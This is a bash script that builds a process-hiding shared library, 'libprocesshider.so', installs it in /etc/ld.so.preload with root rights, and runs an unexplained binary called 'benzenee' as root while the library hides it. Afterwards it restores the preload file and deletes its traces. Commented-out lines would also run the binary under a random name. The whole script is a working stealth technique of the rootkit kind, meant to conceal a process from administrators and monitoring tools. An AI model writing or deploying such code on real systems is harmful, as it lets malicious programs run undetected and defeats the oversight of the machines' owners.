#!/bin/bash

# Store the original content of ld.so.preload
original_ld_preload=$(cat /etc/ld.so.preload)

# Store the original content in a temporary file
echo "$original_ld_preload" > original_ld_preload.tmp

# Compile the C code and create the shared library
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

# Move the shared library to /usr/local/lib/
sudo mv libprocesshider.so /usr/local/lib/

# Add the library path to ld.so.preload
echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload

echo "Process hider library has been built, installed, and added to ld.so.preload."

# Check if the file exists
if [ -f benzenee ]; then
# if [ -f "build/benzenee/benzenee" ]; then
    # filename=$(openssl rand -hex $((RANDOM % 11 + 10)))
    # cp benzenee "$filename"
    # cp "build/benzenee/benzenee" "$filename"
    # sudo chmod 700 "$filename"
    # sudo ./"$filename"
    # rm "$filename"
    
    sudo chmod 700 benzenee
    sudo ./benzenee
fi

# Remove the library path from ld.so.preload...............................

original_ld_preload=$(cat original_ld_preload.tmp)             #uncomment
echo "$original_ld_preload" | sudo tee /etc/ld.so.preload      #uncomment
        # this will restore the original_ld_preload that was saved before editing
        # keep in mind that original content of the /etc/ld.so.preload file stored in .tmp file

# sudo sed -i '$ d' /etc/ld.so.preload
        # Since there's no other operation that might modify ld.so.preload within the script, 
        # you can safely assume that the original content is still intact when you need to remove the library path.
echo "Process hider library has been removed from ld.so.preload."

# Clean up the compiled files
rm -f libprocesshider.so
# Remove the temporary file
rm -f original_ld_preload.tmp

echo "Cleaned up compiled files and temporary files."